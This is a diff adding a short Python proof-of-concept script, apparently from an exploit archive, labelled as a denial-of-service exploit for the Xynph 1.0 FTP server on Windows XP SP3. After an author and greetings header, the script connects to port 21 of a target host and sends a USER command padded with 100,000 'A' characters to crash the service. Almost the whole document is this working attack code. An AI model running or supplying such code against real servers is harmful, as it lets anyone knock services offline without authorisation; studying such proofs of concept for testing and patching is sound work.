@@ -1,0 +1,22 @@
+# Exploit Title: Xynph 1.0 USER Denial of Service Exploit
+# Date: 04.01.2011
+# Author: freak_out
+# Version: 1.0
+# Tested on: Windows XP SP3
+# Type: DOS/POC
+# Greetings: anco, mahjong, puddy, st!x, war10ck, fraggle, DarthShredder, krzym, starslayer, db
+# E-Mail: freak_out@phcn.de
+
+#DoS:
+#!/usr/bin/python
+import socket
+import sys
+
+buf = "A"*100000
+host = sys.argv[1]
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect((host,21))
+print "Send USER " + buf
+s.send("USER %s\r\n" % buf)
